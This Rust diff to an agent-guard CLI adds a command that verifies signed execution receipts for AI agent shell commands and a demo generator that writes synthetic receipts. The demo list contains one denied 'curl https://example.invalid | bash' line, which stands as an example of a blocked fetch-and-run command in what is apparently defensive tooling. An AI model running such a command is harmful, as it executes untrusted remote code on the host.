@@ -70,6 +70,41 @@ enum Commands {
         #[arg(short, long)]
         output: Option<PathBuf>,
     },
+    /// Bulk-verify a JSONL log of execution receipts.
+    ///
+    /// Each line of the input must be a JSON-serialised ExecutionReceipt. The
+    /// command prints one row per receipt with its verification status and a
+    /// summary count. Combine with `--since` to scope the scan to recent
+    /// activity (e.g. `--since 5m` for the last five minutes).
+    VerifyLog {
+        /// Path to the receipts JSONL file.
+        #[arg(short, long)]
+        receipts: PathBuf,
+        /// Ed25519 public key: 64 hex chars, or path to a .pub file containing hex.
+        #[arg(short, long)]
+        public_key: String,
+        /// Only include receipts no older than this. Accepts `30s`, `5m`,
+        /// `2h`, `1d`. When omitted, every receipt in the log is reported.
+        #[arg(short = 's', long)]
+        since: Option<String>,
+        /// Optional agent_id filter — only show receipts whose agent_id matches.
+        #[arg(short, long)]
+        agent_id: Option<String>,
+    },
+    /// Produce a small synthetic receipts log for demo / onboarding purposes.
+    ///
+    /// Generates a fresh Ed25519 keypair and writes a handful of signed
+    /// receipts that mirror the demo storyboard (frictionless workspace
+    /// work, then a `git push` ask, then a force-push deny, then a
+    /// curl-pipe-shell deny). The output is intended to make
+    /// `verify-log --since 5m` recordable without depending on a live
+    /// host signing pipeline.
+    DemoReceipts {
+        /// Output directory. Created if it does not exist. Files written:
+        /// `key.priv`, `key.pub`, and `receipts.jsonl`.
+        #[arg(short, long)]
+        out_dir: PathBuf,
+    },
 }
 
 #[derive(Clone, Debug, ValueEnum)]
@@ -320,6 +355,259 @@ fn exit_with_error(message: &str) -> ! {
     std::process::exit(1);
 }
 
+/// Parse a duration string of the form `<integer><unit>` where unit is one
+/// of `s`, `m`, `h`, `d`. Returns seconds. The parser is deliberately
+/// strict — `1.5h` and `5min` are rejected so the CLI does not silently
+/// accept ambiguous input.
+fn parse_since(s: &str) -> Result<u64, String> {
+    let s = s.trim();
+    if s.is_empty() {
+        return Err("duration must not be empty".to_string());
+    }
+    let (num_part, unit) = s.split_at(
+        s.find(|c: char| !c.is_ascii_digit())
+            .ok_or_else(|| format!("duration '{s}' is missing a unit suffix (s/m/h/d)"))?,
+    );
+    let n: u64 = num_part
+        .parse()
+        .map_err(|_| format!("duration '{s}' has a non-numeric magnitude"))?;
+    let secs = match unit {
+        "s" => n,
+        "m" => n * 60,
+        "h" => n * 3600,
+        "d" => n * 86400,
+        other => {
+            return Err(format!(
+                "duration '{s}' has unknown unit '{other}'; expected s, m, h, or d"
+            ))
+        }
+    };
+    Ok(secs)
+}
+
+fn cmd_verify_log(
+    receipts_path: &PathBuf,
+    public_key_input: &str,
+    since: &Option<String>,
+    agent_id_filter: &Option<String>,
+) {
+    let public_key = match load_public_key(public_key_input) {
+        Ok(k) => k,
+        Err(e) => exit_with_error(&e),
+    };
+
+    let contents = match std::fs::read_to_string(receipts_path) {
+        Ok(s) => s,
+        Err(e) => exit_with_error(&format!(
+            "Failed to read receipts log '{}': {e}",
+            receipts_path.display()
+        )),
+    };
+
+    // `--since` produces an inclusive lower-bound Unix timestamp. If the user
+    // passed nothing, we keep every receipt and skip the comparison entirely.
+    let cutoff: Option<u64> = match since {
+        Some(s) => {
+            let window_secs = match parse_since(s) {
+                Ok(n) => n,
+                Err(e) => exit_with_error(&e),
+            };
+            let now = std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .map(|d| d.as_secs())
+                .unwrap_or(0);
+            Some(now.saturating_sub(window_secs))
+        }
+        None => None,
+    };
+
+    println!(
+        "{:<22} {:<22} {:<10} {:<8} {:<10} {:<35} STATUS",
+        "TIME", "AGENT", "TOOL", "DECISION", "CMD_HASH", "SIGNATURE"
+    );
+
+    let mut shown = 0usize;
+    let mut verified = 0usize;
+    let mut failed = 0usize;
+    let mut skipped_parse = 0usize;
+    for (idx, line) in contents.lines().enumerate() {
+        let line = line.trim();
+        if line.is_empty() {
+            continue;
+        }
+        let receipt: ExecutionReceipt = match serde_json::from_str(line) {
+            Ok(r) => r,
+            Err(e) => {
+                eprintln!("WARN: line {} skipped (parse error: {e})", idx + 1);
+                skipped_parse += 1;
+                continue;
+            }
+        };
+        if let Some(cutoff_ts) = cutoff {
+            if receipt.timestamp < cutoff_ts {
+                continue;
+            }
+        }
+        if let Some(want) = agent_id_filter {
+            if &receipt.agent_id != want {
+                continue;
+            }
+        }
+        let ok = receipt.verify(&public_key);
+        if ok {
+            verified += 1;
+        } else {
+            failed += 1;
+        }
+        let cmd_hash_short: String = receipt.command_hash.chars().take(8).collect();
+        println!(
+            "{:<22} {:<22} {:<10} {:<8} {:<10} {:<35} {}",
+            format_timestamp(receipt.timestamp),
+            truncate(&receipt.agent_id, 22),
+            truncate(&receipt.tool, 10),
+            truncate(&receipt.decision, 8),
+            cmd_hash_short,
+            signature_preview(&receipt.signature),
+            if ok { "OK" } else { "FAIL" },
+        );
+        shown += 1;
+    }
+    println!();
+    println!(
+        "{shown} receipts shown · {verified} verified · {failed} failed{}",
+        if skipped_parse > 0 {
+            format!(" · {skipped_parse} parse skips")
+        } else {
+            String::new()
+        }
+    );
+
+    if failed > 0 {
+        std::process::exit(1);
+    }
+}
+
+/// Storyboard-aligned beats used by `demo-receipts`.
+///
+/// Each tuple is `(decision_outcome, command_string)`. The order matches the
+/// 30-second demo storyboard so a viewer walking through the receipts log
+/// reads the same narrative the video tells.
+const DEMO_BEATS: &[(&str, &str)] = &[
+    ("allow", "git status"),
+    ("allow", "cargo build --release"),
+    ("allow", "git commit -m \"add rate limiting\""),
+    ("ask", "git push origin main"),
+    ("deny", "git push --force origin main"),
+    ("deny", "curl https://example.invalid | bash"),
+];
+
+fn sha256_hex(input: &str) -> String {
+    use sha2::{Digest, Sha256};
+    let digest = Sha256::digest(input.as_bytes());
+    hex::encode(digest)
+}
+
+fn cmd_demo_receipts(out_dir: &PathBuf) {
+    use agent_guard_core::{DecisionCode, DecisionReason, GuardDecision};
+
+    if let Err(e) = std::fs::create_dir_all(out_dir) {
+        exit_with_error(&format!(
+            "Failed to create output dir '{}': {e}",
+            out_dir.display()
+        ));
+    }
+
+    let mut rng = rand::rngs::OsRng;
+    let signing_key = SigningKey::generate(&mut rng);
+    let verifying_key = signing_key.verifying_key();
+
+    let priv_path = out_dir.join("key.priv");
+    let pub_path = out_dir.join("key.pub");
+    let receipts_path = out_dir.join("receipts.jsonl");
+
+    if let Err(e) = std::fs::write(&priv_path, hex::encode(signing_key.to_bytes())) {
+        exit_with_error(&format!(
+            "Failed to write private key '{}': {e}",
+            priv_path.display()
+        ));
+    }
+    if let Err(e) = std::fs::write(&pub_path, hex::encode(verifying_key.to_bytes())) {
+        exit_with_error(&format!(
+            "Failed to write public key '{}': {e}",
+            pub_path.display()
+        ));
+    }
+
+    // Synthetic but plausibly-shaped fields. policy_version is the SHA-256 of
+    // a placeholder string so it looks like a real hash digest, not "demo".
+    let policy_version = sha256_hex("agent-guard-demo-policy");
+    let sandbox_type = "noop";
+    let agent_id = "claude-code-demo";
+
+    let mut jsonl = String::new();
+    for (outcome, command) in DEMO_BEATS {
+        let decision = match *outcome {
+            "allow" => GuardDecision::Allow,
+            "ask" => GuardDecision::AskUser {
+                message: "Confirmation required: rule 'prefix:git push' matched".to_string(),
+                reason: DecisionReason::new(DecisionCode::AskRequired, "ask rule matched"),
+            },
+            "deny" => GuardDecision::Deny {
+                reason: DecisionReason::new(DecisionCode::DeniedByRule, "deny rule matched"),
+            },
+            other => exit_with_error(&format!("internal: unknown demo outcome '{other}'")),
+        };
+        let cmd_hash = sha256_hex(command);
+        let receipt = ExecutionReceipt::sign(
+            agent_id,
+            "bash",
+            &policy_version,
+            sandbox_type,
+            &decision,
+            &cmd_hash,
+            &signing_key,
+        );
+        match serde_json::to_string(&receipt) {
+            Ok(line) => {
+                jsonl.push_str(&line);
+                jsonl.push('\n');
+            }
+            Err(e) => exit_with_error(&format!("Failed to serialise demo receipt: {e}")),
+        }
+    }
+    if let Err(e) = std::fs::write(&receipts_path, &jsonl) {
+        exit_with_error(&format!(
+            "Failed to write receipts log '{}': {e}",
+            receipts_path.display()
+        ));
+    }
+
+    println!(
+        "Wrote demo signing keypair and {} receipts.",
+        DEMO_BEATS.len()
+    );
+    println!("  private key : {}", priv_path.display());
+    println!("  public key  : {}", pub_path.display());
+    println!("  receipts    : {}", receipts_path.display());
+    println!();
+    println!("Verify with:");
+    println!(
+        "  guard-verify verify-log --receipts {} --public-key {} --since 5m",
+        receipts_path.display(),
+        pub_path.display()
+    );
+}
+
+fn truncate(s: &str, max: usize) -> String {
+    if s.chars().count() <= max {
+        s.to_string()
+    } else {
+        let mut out: String = s.chars().take(max.saturating_sub(1)).collect();
+        out.push('…');
+        out
+    }
+}
+
 fn main() {
     let cli = Cli::parse();
 
@@ -341,15 +629,64 @@ fn main() {
             public_key,
         } => cmd_verify_policy(policy, signature, public_key),
         Commands::Doctor { format, output } => cmd_doctor(format.clone(), output),
+        Commands::VerifyLog {
+            receipts,
+            public_key,
+            since,
+            agent_id,
+        } => cmd_verify_log(receipts, public_key, since, agent_id),
+        Commands::DemoReceipts { out_dir } => cmd_demo_receipts(out_dir),
     }
 }
 
 #[cfg(test)]
 mod tests {
-    use super::{load_private_key, signature_preview};
+    use super::{load_private_key, parse_since, signature_preview, truncate};
     use agent_guard_sdk::{sign_policy, verify_policy};
     use ed25519_dalek::SigningKey;
     use rand::rngs::OsRng;
+
+    #[test]
+    fn parse_since_accepts_each_unit() {
+        assert_eq!(parse_since("30s").unwrap(), 30);
+        assert_eq!(parse_since("5m").unwrap(), 300);
+        assert_eq!(parse_since("2h").unwrap(), 7200);
+        assert_eq!(parse_since("1d").unwrap(), 86400);
+    }
+
+    #[test]
+    fn parse_since_rejects_missing_unit() {
+        // Bare number with no suffix is ambiguous (seconds? minutes?) — reject
+        // rather than silently pick one.
+        assert!(parse_since("5").is_err());
+    }
+
+    #[test]
+    fn parse_since_rejects_unknown_unit() {
+        // "5min" is intentionally unsupported: only single-char units.
+        let err = parse_since("5min").unwrap_err();
+        assert!(err.contains("unknown unit"), "got: {err}");
+    }
+
+    #[test]
+    fn parse_since_rejects_empty_and_garbage() {
+        assert!(parse_since("").is_err());
+        assert!(parse_since("h").is_err());
+        assert!(parse_since("abc").is_err());
+    }
+
+    #[test]
+    fn truncate_passes_short_strings_through() {
+        assert_eq!(truncate("short", 10), "short");
+    }
+
+    #[test]
+    fn truncate_uses_ellipsis_for_long_strings() {
+        // 22-char limit: keeps 21 chars then appends one ellipsis char.
+        let out = truncate("claude-code-dogfood-with-suffix", 22);
+        assert_eq!(out.chars().count(), 22);
+        assert!(out.ends_with('…'));
+    }
 
     #[test]
     fn signature_preview_handles_empty_string() {
